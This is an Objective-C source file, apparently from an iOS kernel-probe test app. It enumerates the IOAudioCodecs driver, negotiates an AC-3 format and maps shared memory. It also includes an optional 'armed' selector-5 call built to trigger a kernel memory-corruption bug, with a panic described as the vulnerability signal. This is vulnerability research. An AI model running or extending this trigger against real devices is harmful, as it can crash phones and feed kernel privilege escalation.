#import "KPIOAudioCodecsProbeModule.h"

#import "KPLog.h"

#import <IOKit/IOKitLib.h>
#import <mach/mach.h>

#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <mach-o/loader.h>
#include <mach-o/dyld.h>

#ifndef KP_IOAUDIO27_ENABLE_ARMED
#define KP_IOAUDIO27_ENABLE_ARMED 0
#endif

#define KP_AUDIO_SELECTOR_START 0
#define KP_AUDIO_SELECTOR_STOP 1
#define KP_AUDIO_SELECTOR_SET_FORMAT 2
#define KP_AUDIO_SELECTOR_TERMINATE 4
#define KP_AUDIO_SELECTOR_PROCESS 5
#define KP_AUDIO_INPUT_MEMORY 0
#define KP_AUDIO_OUTPUT_MEMORY 1
#define KP_AUDIO_FORMAT_AC3 0x61632d33
#define KP_AUDIO_FORMAT_CAC3 0x63616333
#define KP_AUDIO_PACKET_CAPACITY 0x1800
#define KP_AUDIO_BENIGN_LENGTH 0x100

@interface KPIOAudioCodecsProbeModule ()
@property (nonatomic, copy, readwrite) NSString *identifier;
@property (nonatomic, copy, readwrite) NSString *title;
@property (nonatomic, copy, readwrite) NSString *subtitle;
@property (nonatomic, copy, readwrite) NSString *icon;
@property (nonatomic, assign, readwrite) KPTestSection section;
@end

typedef struct {
    double sampleRate;
    uint32_t formatID;
    uint32_t formatFlags;
    uint32_t bytesPerPacket;
    uint32_t framesPerPacket;
    uint32_t channelsPerPacket;
    uint32_t bitsPerChannel;
    uint32_t reserved;
} KPAudioStreamBasicDescription;

typedef struct {
    KPAudioStreamBasicDescription input;
    KPAudioStreamBasicDescription output;
} KPAudioFormatPair;

_Static_assert(sizeof(KPAudioStreamBasicDescription) == 0x28, "kernel ASBD ABI");
_Static_assert(sizeof(KPAudioFormatPair) == 0x50, "selector-2 format-pair ABI");

typedef struct {
    io_connect_t connection;
    mach_vm_address_t inputAddress;
    mach_vm_size_t inputSize;
    mach_vm_address_t outputAddress;
    mach_vm_size_t outputSize;
    BOOL inputMapped;
    BOOL outputMapped;
    BOOL started;
    BOOL formatSet;
} KPAudioSession;

typedef struct {
    kern_return_t kr;
    uint32_t count;
    uint64_t value[2];
} KPAudioProcessResult;

static const char *KPAudioKR(kern_return_t kr) {
    switch (kr) {
        case KERN_SUCCESS: return "KERN_SUCCESS";
        case kIOReturnNoDevice: return "kIOReturnNoDevice";
        case kIOReturnNotOpen: return "kIOReturnNotOpen";
        case kIOReturnNotReady: return "kIOReturnNotReady";
        case kIOReturnNotPermitted: return "kIOReturnNotPermitted";
        case kIOReturnUnsupported: return "kIOReturnUnsupported";
        case kIOReturnBadArgument: return "kIOReturnBadArgument";
        case kIOReturnError: return "kIOReturnError";
        default: return "kern_return";
    }
}

static void KPAudioAppendKR(NSMutableString *report, const char *operation, kern_return_t kr) {
    [report appendFormat:@"    %-34s kr=0x%08x (%s / %d)\n",
     operation, (uint32_t)kr, KPAudioKR(kr), (int32_t)kr];
}

static NSString *KPAudioCFDescription(CFTypeRef value) {
    if (!value) {
        return @"<null>";
    }
    CFStringRef description = CFCopyDescription(value);
    if (!description) {
        return @"<description-error>";
    }
    NSString *result = [NSString stringWithFormat:@"%@", description];
    CFRelease(description);
    return result;
}

static BOOL KPAudioArrayContainsClass(CFTypeRef value) {
    if (!value || CFGetTypeID(value) != CFArrayGetTypeID()) {
        return NO;
    }
    CFArrayRef array = (CFArrayRef)value;
    return CFArrayContainsValue(array,
                                CFRangeMake(0, CFArrayGetCount(array)),
                                CFSTR("IOAudioCodecsUserClient"));
}

static uint32_t KPAudioBE32(const uint8_t *p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | p[3];
}

static void KPAudioLogEffectiveEntitlements(NSMutableString *report) {
    [report appendString:@"    entitlements source: embedded code signature (SecTask API removed: codesigning crash on this device)\n"];
    char path[1024];
    uint32_t pathSize = sizeof(path);
    if (_NSGetExecutablePath(path, &pathSize) != 0) {
        [report appendString:@"    embedded entitlements: _NSGetExecutablePath failed\n"];
        return;
    }
    FILE *file = fopen(path, "rb");
    if (!file) {
        [report appendString:@"    embedded entitlements: fopen failed\n"];
        return;
    }
    struct mach_header_64 header;
    if (fread(&header, sizeof(header), 1, file) != 1 || header.magic != MH_MAGIC_64) {
        [report appendString:@"    embedded entitlements: bad mach-o\n"];
        fclose(file);
        return;
    }
    uint32_t dataoff = 0, datasize = 0;
    for (uint32_t index = 0; index < header.ncmds; index++) {
        struct load_command command;
        if (fread(&command, sizeof(command), 1, file) != 1) break;
        if (command.cmd == LC_CODE_SIGNATURE) {
            struct linkedit_data_command cs;
            if (fseek(file, -((long)sizeof(command)), SEEK_CUR) == 0 &&
                fread(&cs, sizeof(cs), 1, file) == 1) {
                dataoff = cs.dataoff;
                datasize = cs.datasize;
            }
            break;
        }
        if (command.cmdsize < sizeof(command) ||
            fseek(file, (long)command.cmdsize - (long)sizeof(command), SEEK_CUR) != 0) break;
    }
    if (!dataoff || !datasize || datasize > (16u << 20) ||
        fseek(file, (long)dataoff, SEEK_SET) != 0) {
        [report appendString:@"    embedded entitlements: no LC_CODE_SIGNATURE\n"];
        fclose(file);
        return;
    }
    uint8_t *blob = malloc(datasize);
    if (!blob || fread(blob, datasize, 1, file) != 1) {
        free(blob);
        fclose(file);
        [report appendString:@"    embedded entitlements: signature read failed\n"];
        return;
    }
    fclose(file);
    BOOL found = NO;
    for (uint32_t offset = 0; offset + 12 < datasize; offset++) {
        if (KPAudioBE32(blob + offset) != 0xfade7171) continue;
        uint32_t length = KPAudioBE32(blob + offset + 4);
        if (length < 12 || offset + length > datasize) continue;
        NSString *xml = [[NSString alloc] initWithBytes:blob + offset + 8
                                                 length:length - 8
                                               encoding:NSUTF8StringEncoding];
        [report appendFormat:@"    embedded entitlements XML:\n%@\n", xml ?: @"<non-utf8>"];
        [report appendFormat:@"    embedded exception contains IOAudioCodecsUserClient: %s (requested, honoured unknown without SecTask)\n",
         xml && [xml containsString:@"IOAudioCodecsUserClient"] ? "YES" : "NO"];
        found = YES;
        break;
    }
    if (!found) {
        [report appendString:@"    embedded entitlements: no 0xfade7171 blob (unsigned/adhoc without entitlements?)\n"];
    }
    free(blob);
}

static void KPAudioLogProviderProperties(io_service_t service, NSMutableString *report) {
    CFMutableDictionaryRef properties = NULL;
    kern_return_t kr = IORegistryEntryCreateCFProperties(service, &properties, NULL, 0);
    if (kr != KERN_SUCCESS || !properties) {
        [report appendFormat:@"    provider properties: kr=0x%08x\n", (uint32_t)kr];
        return;
    }
    const CFStringRef keys[] = {
        CFSTR("IOUserClientClass"),
        CFSTR("IOUserClientEntitlements"),
        CFSTR("Exclusive"),
    };
    const char *names[] = {"IOUserClientClass", "IOUserClientEntitlements", "Exclusive"};
    for (uint32_t index = 0; index < 3; index++) {
        CFTypeRef value = CFDictionaryGetValue(properties, keys[index]);
        [report appendFormat:@"    provider %-28s %@\n", names[index], KPAudioCFDescription(value)];
    }
    CFRelease(properties);
}

static void KPAudioEnumerateClass(NSMutableString *report, const char *className) {
    io_iterator_t iterator = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
                                                    IOServiceMatching(className),
                                                    &iterator);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"  enum %-28s kr=0x%08x\n", className, (uint32_t)kr];
        return;
    }
    uint32_t count = 0;
    io_service_t service = IO_OBJECT_NULL;
    while ((service = IOIteratorNext(iterator)) != IO_OBJECT_NULL) {
        io_name_t name;
        io_name_t objectClass;
        memset(name, 0, sizeof(name));
        memset(objectClass, 0, sizeof(objectClass));
        kern_return_t nameKR = IORegistryEntryGetName(service, name);
        kern_return_t classKR = IOObjectGetClass(service, objectClass);
        [report appendFormat:@"    match[%u] service=%u name=%s(%d) class=%s(%d)\n",
         count, service,
         nameKR == KERN_SUCCESS ? name : "<name-error>", nameKR,
         classKR == KERN_SUCCESS ? objectClass : "<class-error>", classKR];
        IOObjectRelease(service);
        count++;
    }
    [report appendFormat:@"  enum %-28s count=%u\n", className, count];
    IOObjectRelease(iterator);
}

static kern_return_t KPAudioCallSimple(io_connect_t connection, uint32_t selector) {
    return IOConnectCallMethod(connection, selector,
                               NULL, 0, NULL, 0,
                               NULL, NULL, NULL, NULL);
}

static KPAudioFormatPair KPAudioMakeFormatPair(void) {
    KPAudioFormatPair pair;
    memset(&pair, 0, sizeof(pair));
    pair.input.sampleRate = 48000.0;
    pair.input.formatID = KP_AUDIO_FORMAT_AC3;
    pair.output.sampleRate = 48000.0;
    pair.output.formatID = KP_AUDIO_FORMAT_CAC3;
    pair.output.formatFlags = 0x0c;
    pair.output.bytesPerPacket = KP_AUDIO_PACKET_CAPACITY;
    pair.output.framesPerPacket = 0x600;
    pair.output.channelsPerPacket = 4;
    pair.output.bitsPerChannel = 2;
    pair.output.reserved = 0x10;
    return pair;
}

static void KPAudioCleanup(KPAudioSession *session, NSMutableString *report) {
    if (session->inputMapped) {
        kern_return_t kr = IOConnectUnmapMemory(session->connection,
                                                KP_AUDIO_INPUT_MEMORY,
                                                mach_task_self(),
                                                session->inputAddress);
        KPAudioAppendKR(report, "unmap input", kr);
        session->inputMapped = NO;
    }
    if (session->outputMapped) {
        kern_return_t kr = IOConnectUnmapMemory(session->connection,
                                                KP_AUDIO_OUTPUT_MEMORY,
                                                mach_task_self(),
                                                session->outputAddress);
        KPAudioAppendKR(report, "unmap output", kr);
        session->outputMapped = NO;
    }
    if (session->formatSet) {
        kern_return_t kr = KPAudioCallSimple(session->connection, KP_AUDIO_SELECTOR_TERMINATE);
        KPAudioAppendKR(report, "selector 4 terminate", kr);
        session->formatSet = NO;
    }
    if (session->started) {
        kern_return_t kr = KPAudioCallSimple(session->connection, KP_AUDIO_SELECTOR_STOP);
        KPAudioAppendKR(report, "selector 1 stop", kr);
        session->started = NO;
    }
    if (session->connection != IO_OBJECT_NULL) {
        kern_return_t kr = IOServiceClose(session->connection);
        KPAudioAppendKR(report, "IOServiceClose", kr);
        session->connection = IO_OBJECT_NULL;
    }
}

static KPAudioProcessResult KPAudioProcess(KPAudioSession *session,
                                            uint32_t packetLength,
                                            NSMutableString *report,
                                            BOOL armed) {
    KPAudioProcessResult result;
    memset(&result, 0, sizeof(result));
    uint8_t *input = (uint8_t *)(uintptr_t)session->inputAddress;
    memset(input, 0xa5, packetLength);
    input[0] = 0x0b;
    input[1] = 0x77;

    uint64_t scalars[3] = {0, packetLength, 0};
    result.count = 2;
    if (armed) {
        [KPLog.shared appendFormat:
         @"IOAudioCodecs ARMED selector 5: offset=0 N=0x%x B=A=0x%x; expected old-path trailing memset size=0xfffffff8",
         packetLength, KP_AUDIO_PACKET_CAPACITY];
        [report appendString:@"  ARMED call issued: selector 5, N=B=A=0x1800, no spray, no KRW.\n"];
    }
    result.kr = IOConnectCallMethod(session->connection,
                                    KP_AUDIO_SELECTOR_PROCESS,
                                    scalars, 3,
                                    NULL, 0,
                                    result.value, &result.count,
                                    NULL, NULL);
    [report appendFormat:@"    process %s N=0x%x: kr=0x%08x (%s / %d) count=%u out0=0x%llx out1=0x%llx\n",
     armed ? "armed" : "benign", packetLength,
     (uint32_t)result.kr, KPAudioKR(result.kr), (int32_t)result.kr,
     result.count, result.value[0], result.value[1]];
    return result;
}

static void KPAudioRunSession(NSMutableString *report, BOOL armed) {
    KPAudioSession session;
    memset(&session, 0, sizeof(session));

    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
                                                        IOServiceMatching("IOAudioCodecs"));
    if (service == IO_OBJECT_NULL) {
        [report appendString:@"  IOAudioCodecs provider not found; negotiation aborted.\n"];
        return;
    }
    KPAudioLogEffectiveEntitlements(report);
    KPAudioLogProviderProperties(service, report);
    [report appendString:@"    open types 0/1/2: one-shot each; IOService::newUserClient disasm has no type whitelist\n"];
    const uint32_t openTypes[] = {0, 1, 2};
    kern_return_t kr = kIOReturnError;
    for (uint32_t index = 0; index < sizeof(openTypes) / sizeof(openTypes[0]); index++) {
        uint32_t type = openTypes[index];
        kr = IOServiceOpen(service, mach_task_self(), type, &session.connection);
        [report appendFormat:@"    IOServiceOpen type=%u          kr=0x%08x (%s / %d)\n",
         type, (uint32_t)kr, KPAudioKR(kr), (int32_t)kr];
        if (kr == KERN_SUCCESS) {
            break;
        }
    }
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) {
        [report appendString:@"  OPEN DENIED on all attempted types; selector 5 not reached.\n"];
        return;
    }

    io_name_t connectionClass;
    memset(connectionClass, 0, sizeof(connectionClass));
    kern_return_t classKR = IOObjectGetClass(session.connection, connectionClass);
    [report appendFormat:@"    connection=%u class=%s (kr=0x%08x)\n",
     session.connection,
     classKR == KERN_SUCCESS ? connectionClass : "<class-error>", (uint32_t)classKR];

    kr = KPAudioCallSimple(session.connection, KP_AUDIO_SELECTOR_START);
    KPAudioAppendKR(report, "selector 0 start", kr);
    if (kr != KERN_SUCCESS) {
        KPAudioCleanup(&session, report);
        return;
    }
    session.started = YES;

    KPAudioFormatPair pair = KPAudioMakeFormatPair();
    kr = IOConnectCallMethod(session.connection,
                             KP_AUDIO_SELECTOR_SET_FORMAT,
                             NULL, 0,
                             &pair, sizeof(pair),
                             NULL, NULL,
                             NULL, NULL);
    KPAudioAppendKR(report, "selector 2 ac-3 -> cac3", kr);
    if (kr != KERN_SUCCESS) {
        KPAudioCleanup(&session, report);
        return;
    }
    session.formatSet = YES;
    [report appendFormat:@"    ASBD: sampleRate=48000 output flags=0x%x B=0x%x FPP=0x%x channels=%u bits=%u reserved=0x%x\n",
     pair.output.formatFlags, pair.output.bytesPerPacket, pair.output.framesPerPacket,
     pair.output.channelsPerPacket, pair.output.bitsPerChannel, pair.output.reserved];

    kr = IOConnectMapMemory(session.connection,
                            KP_AUDIO_INPUT_MEMORY,
                            mach_task_self(),
                            &session.inputAddress,
                            &session.inputSize,
                            kIOMapAnywhere);
    [report appendFormat:@"    map input type=0: kr=0x%08x address=0x%llx size=0x%llx\n",
     (uint32_t)kr, session.inputAddress, session.inputSize];
    if (kr != KERN_SUCCESS) {
        KPAudioCleanup(&session, report);
        return;
    }
    session.inputMapped = YES;

    kr = IOConnectMapMemory(session.connection,
                            KP_AUDIO_OUTPUT_MEMORY,
                            mach_task_self(),
                            &session.outputAddress,
                            &session.outputSize,
                            kIOMapAnywhere);
    [report appendFormat:@"    map output type=1: kr=0x%08x address=0x%llx size=0x%llx\n",
     (uint32_t)kr, session.outputAddress, session.outputSize];
    if (kr != KERN_SUCCESS) {
        KPAudioCleanup(&session, report);
        return;
    }
    session.outputMapped = YES;

    uint32_t required = armed ? KP_AUDIO_PACKET_CAPACITY : KP_AUDIO_BENIGN_LENGTH;
    if (session.inputSize < required || session.outputSize < KP_AUDIO_PACKET_CAPACITY) {
        [report appendFormat:@"  CAPACITY FAILED: required input>=0x%x output>=0x%x; AC3 path not armed.\n",
         required, KP_AUDIO_PACKET_CAPACITY];
        KPAudioCleanup(&session, report);
        return;
    }

    KPAudioProcessResult benign = KPAudioProcess(&session,
                                                 KP_AUDIO_BENIGN_LENGTH,
                                                 report,
                                                 NO);
    BOOL baseline = benign.kr == KERN_SUCCESS && benign.count >= 1 &&
                    benign.value[0] == KP_AUDIO_PACKET_CAPACITY;
    [report appendFormat:@"  BASELINE: %s\n",
     baseline ? "AC3 selector-5 path reached; benign conversion accepted" :
                "benign conversion was not accepted; armed call is withheld"];
    if (!baseline) {
        KPAudioCleanup(&session, report);
        return;
    }

#if KP_IOAUDIO27_ENABLE_ARMED
    if (armed) {
        KPAudioProcessResult trigger = KPAudioProcess(&session,
                                                      KP_AUDIO_PACKET_CAPACITY,
                                                      report,
                                                      YES);
        [report appendFormat:@"  ARMED RETURNED (no panic): kr=0x%08x count=%u out0=0x%llx out1=0x%llx. "
         @"On 27.2 the new bounds check is expected to reject before copy; a panic on 27.0.1 is the positive vulnerability signal.\n",
         (uint32_t)trigger.kr, trigger.count, trigger.value[0], trigger.value[1]];
    }
#else
    (void)required;
#endif

    KPAudioCleanup(&session, report);
}

@implementation KPIOAudioCodecsProbeModule

- (instancetype)init {
    return [self initWithArmed:NO];
}

- (instancetype)initWithArmed:(BOOL)armed {
    self = [super init];
    if (self) {
        _armed = armed;
        if (armed) {
            _identifier = @"ioaudio27.panic";
            _title = @"IOAudioCodecs AC3 Armed";
            _subtitle = @"ARMED ac-3 → cac3 N=B=A — may panic the kernel";
            _icon = @"exclamationmark.triangle";
        } else {
            _identifier = @"ioaudio27.probe";
            _title = @"IOAudioCodecs AC3 Probe";
            _subtitle = @"Safe UC enumeration, format negotiation and benign AC3 conversion";
            _icon = @"waveform";
        }
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV3 IOAudioCodecs / A5AC3PassThrough probe ===\n"];
    [report appendString:@"Target: iPhone16,1 / A17 Pro; fixed in iOS 27.2; selector 5 -> #59 -> #73 -> #9 -> #217 -> ProcessSinglePacket.\n"];
    [report appendString:@"Entitlements: IOAudioCodecsUserClient exception is explicit; existing no-sandbox/no-container requests are retained as a fallback, not assumed to be honoured.\n"];
    [report appendString:@"Exact registry classes: provider=IOAudioCodecs, user client=IOAudioCodecsUserClient. A5AC3PassThrough is internal, not a registry service to open.\n"];

#if !KP_IOAUDIO27_ENABLE_ARMED
    if (self.isArmed) {
        [report appendString:@"Armed: NOT COMPILED (requires KP_IOAUDIO27_ENABLE_ARMED=1 in the race build).\n"];
        return report;
    }
#else
    [report appendFormat:@"Armed build: yes; this row is %s.\n", self.isArmed ? "ARMED" : "safe baseline only"];
#endif

    KPAudioEnumerateClass(report, "IOAudioCodecs");
    KPAudioEnumerateClass(report, "IOAudioCodecsUserClient");
    KPAudioRunSession(report, self.isArmed);
    return report;
}

@end
